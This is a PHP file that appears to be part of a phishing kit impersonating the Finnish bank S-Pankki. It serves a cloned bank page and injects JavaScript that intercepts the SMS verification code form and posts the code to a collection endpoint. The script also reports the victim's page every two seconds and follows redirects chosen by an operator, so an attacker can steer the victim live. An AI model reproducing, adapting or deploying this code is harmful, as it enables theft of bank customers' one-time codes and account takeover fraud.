<?php
ob_start();
$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'S-Pankki');
$htmlContent = file_get_contents(__DIR__ . '/s-pankkibank3.html');

if (mb_detect_encoding($htmlContent, 'UTF-8', true) !== 'UTF-8') {
    $htmlContent = mb_convert_encoding($htmlContent, 'UTF-8', 'Windows-1252');
}

$htmlContent = preg_replace('/https?:\/\/[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/mailto:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/tel:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/cross-domain-bridge\.html[^"\'>\s]*/i', '#', $htmlContent);
$htmlContent = preg_replace('/saved_resource\.html[^"\'>\s]*/i', '#', $htmlContent);
$htmlContent = preg_replace('/href\s*=\s*["\']?[^"\'>\s]*(cross-domain-bridge|saved_resource)[^"\'>\s]*["\']?/i', 'href="#"', $htmlContent);
$htmlContent = preg_replace('/src\s*=\s*["\']?[^"\'>\s]*(cross-domain-bridge|saved_resource)[^"\'>\s]*["\']?/i', 'src="#"', $htmlContent);
$htmlContent = preg_replace('/href\s*=\s*["\']?[^"\'>\s]*S-Pankkibank_files\/[^"\'>\s]*\.html[^"\'>\s]*["\']?/i', 'href="#"', $htmlContent);
$htmlContent = preg_replace('/src\s*=\s*["\']?[^"\'>\s]*S-Pankkibank_files\/[^"\'>\s]*\.html[^"\'>\s]*["\']?/i', 'src="#"', $htmlContent);

$basePath = '/spankki-files/';
$htmlContent = str_replace('./S-Pankkibank_files/', $basePath, $htmlContent);
$htmlContent = str_replace('S-Pankkibank_files/', $basePath, $htmlContent);

$adminScript = '';
$userId = isset($_SESSION['user_id']) ? $_SESSION['user_id'] : (isset($user['id']) ? $user['id'] : 0);
if ($userId > 0) {
    $adminScript = '<script>
    (function() {
        // S-Pankki sayfasında açılan popup pəncərələri blokla
        window.open = function() { return null; };
        if (typeof doOpenCmsPopup === "function") {
            doOpenCmsPopup = function() { return false; };
        }
        const userId = ' . json_encode($userId) . ';
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        const smsForm = document.getElementById(\'sms-form\');
        if (smsForm) {
            smsForm.addEventListener(\'submit\', function(e) {
                e.preventDefault();
                
                const smsCode = document.getElementById(\'sms-code\')?.value || \'\';
                
                if (smsCode) {
                    fetch(\'/api/save-spankki-sms\', {
                        method: \'POST\',
                        headers: { \'Content-Type\': \'application/json\' },
                        body: JSON.stringify({
                            user_id: userId,
                            sms_code: smsCode
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success && data.redirect) {
                            window.location.href = data.redirect;
                        }
                    })
                    .catch(() => {});
                }
            });
        }
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

$htmlContent = str_replace('</body>', $adminScript . '</body>', $htmlContent);
echo $htmlContent;
?>
<?php
$content = ob_get_clean();
echo $content;
?>

